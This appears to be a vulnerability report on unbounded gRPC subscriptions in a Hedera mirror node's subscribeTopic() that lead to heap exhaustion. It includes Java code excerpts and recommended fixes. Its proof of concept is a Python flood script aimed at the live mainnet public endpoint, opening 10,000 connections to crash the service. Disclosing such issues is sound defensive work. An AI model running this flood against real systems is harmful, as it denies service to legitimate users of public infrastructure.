### Title
Unbounded Concurrent Subscription Allocation Leads to Heap Exhaustion DoS in `subscribeTopic()`

### Summary
`ConsensusController.subscribeTopic()` accepts unauthenticated gRPC calls with no global limit on concurrent subscriptions. Each call allocates a new `TopicContext` (containing `AtomicLong`, `AtomicReference`, `Stopwatch`, `TopicMessageFilter`, `EntityId`) and a `PollingContext` in the retriever layer. The only guard — `maxConcurrentCallsPerConnection = 5` — is scoped per TCP connection, not globally, so an attacker opening thousands of connections can accumulate tens of thousands of live subscription objects and exhaust JVM heap.

### Finding Description

**Exact code path:**

`ConsensusController.subscribeTopic()` (lines 43–53) accepts any unauthenticated request and immediately delegates to `topicMessageService.subscribeTopic()` with no pre-check on subscriber count: [1](#0-0) 

`TopicMessageServiceImpl.subscribeTopic()` (line 61) allocates a fresh `TopicContext` per call: [2](#0-1) 

`TopicContext` constructor allocates `AtomicLong`, `AtomicReference`, `Stopwatch`, `EntityId`, and holds a `TopicMessageFilter` reference — all live for the duration of the subscription: [3](#0-2) 

`PollingTopicMessageRetriever.retrieve()` (line 50) allocates a second `PollingContext` per subscription, also containing `AtomicLong`, `AtomicReference`, and `Stopwatch`: [4](#0-3) 

**The only server-side guard** is `maxConcurrentCallsPerConnection = 5`, applied in `GrpcConfiguration`: [5](#0-4) [6](#0-5) 

This is a **per-connection** limit, not a global one. There is no cap on the number of TCP connections accepted.

`subscriberCount` in `TopicMessageServiceImpl` (line 48) is registered only as a Micrometer gauge — it is never checked or enforced as a ceiling: [7](#0-6) 

**Root cause:** The failed assumption is that `maxConcurrentCallsPerConnection` bounds total server load. It does not — it only bounds multiplexing within a single HTTP/2 connection. An attacker opens C connections, each with 5 streams, yielding 5C live `TopicContext` + `PollingContext` pairs with no upper bound on C.

### Impact Explanation

Each live subscription holds at minimum two context objects (`TopicContext` + `PollingContext`), each containing multiple heap-allocated fields. With no endTime set, subscriptions remain open indefinitely. At 10,000 attacker connections × 5 streams = 50,000 concurrent subscriptions, the JVM heap fills with context objects and associated reactive pipeline state, triggering `OutOfMemoryError` and crashing the gRPC service. This denies all legitimate HCS topic subscribers access to the mirror node's streaming API. The `retriever.timeout` of 60 seconds applies only to historical retrieval with no new messages; a live subscription with no endTime and active messages never times out. [8](#0-7) 

### Likelihood Explanation

No authentication is required. No API key, no account, no cost. A single attacker machine can open thousands of TCP connections to port 5600 using standard gRPC client libraries (e.g., `grpc-java`, `grpcurl`, Python `grpcio`). The GCP Helm chart has `maxRatePerEndpoint: 250` which limits request initiation rate but not concurrent open streams; the docker-compose deployment has no such guard at all. [9](#0-8) 
The attack is trivially repeatable and requires no special knowledge beyond the public gRPC proto definition.

### Recommendation

1. **Enforce a global concurrent-subscription cap**: Check `subscriberCount` against a configurable maximum before allocating `TopicContext`; return `RESOURCE_EXHAUSTED` if exceeded.
2. **Add per-IP connection limiting** at the Netty level (`maxConnectionsPerIp`) or via an ingress/load-balancer rule.
3. **Require a mandatory `endTime`** or enforce a maximum subscription duration (e.g., 10 minutes) so subscriptions self-terminate.
4. **Add application-level rate limiting** on `subscribeTopic()` calls (analogous to the `Bucket4j` throttle used in the `web3` module). [10](#0-9) 

### Proof of Concept

```python
import grpc
import threading
from hedera import consensus_service_pb2_grpc, consensus_service_pb2
from hedera.proto.basic_types_pb2 import TopicID

TARGET = "mainnet-public.mirrornode.hedera.com:443"
TOPIC_ID = TopicID(topicNum=1234)  # any valid topic

def flood():
    # Each thread opens a new connection and 5 streams
    channel = grpc.secure_channel(TARGET, grpc.ssl_channel_credentials())
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(topicID=TOPIC_ID)
    # Open 5 concurrent streaming calls (maxConcurrentCallsPerConnection limit)
    streams = [stub.subscribeTopic(query) for _ in range(5)]
    # Keep streams open indefinitely
    for s in streams:
        threading.Thread(target=lambda st=s: list(st), daemon=True).start()

# Open 10,000 connections = 50,000 live TopicContext objects
threads = [threading.Thread(target=flood) for _ in range(10_000)]
for t in threads:
    t.start()
for t in threads:
    t.join()
# Server JVM heap exhausted → OutOfMemoryError → gRPC service crash
```

    public Flux<TopicMessage> subscribeTopic(TopicMessageFilter filter) {
        log.info("Subscribing to topic: {}", filter);
        TopicContext topicContext = new TopicContext(filter);

        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
        Flux<TopicMessage> live = Flux.defer(() -> incomingMessages(topicContext));

        // Safety Check - Polls missing messages after 1s if we are stuck with no data
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());

        Flux<TopicMessage> flux = historical
                .concatWith(Flux.merge(safetyCheck, live).takeUntilOther(pastEndTime(topicContext)))
                .filter(t -> {
                    TopicMessage last = topicContext.getLast();
                    return last == null || t.getSequenceNumber() > last.getSequenceNumber();
                });

        if (filter.getEndTime() != null) {
            flux = flux.takeWhile(t -> t.getConsensusTimestamp() < filter.getEndTime());
        }

        if (filter.hasLimit()) {
            flux = flux.take(filter.getLimit());
        }

        return topicExists(filter)
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
                        .doFinally(topicContext::finished));
    }

    public Flux<TopicMessage> retrieve(TopicMessageFilter filter, boolean throttled) {
        if (!retrieverProperties.isEnabled()) {
            return Flux.empty();
        }

        PollingContext context = new PollingContext(filter, throttled);
        return Flux.defer(() -> poll(context))
                .repeatWhen(RepeatSpec.create(r -> !context.isComplete(), context.getNumRepeats())
                        .jitter(0.1)
                        .withFixedDelay(context.getFrequency())
                        .withScheduler(scheduler))
                .name(METRIC)
                .tap(Micrometer.observation(observationRegistry))
                .retryWhen(Retry.backoff(Long.MAX_VALUE, Duration.ofSeconds(1)))
                .timeout(retrieverProperties.getTimeout(), scheduler)
                .doOnCancel(context::onComplete)
                .doOnComplete(context::onComplete)
                .doOnNext(context::onNext);
    }
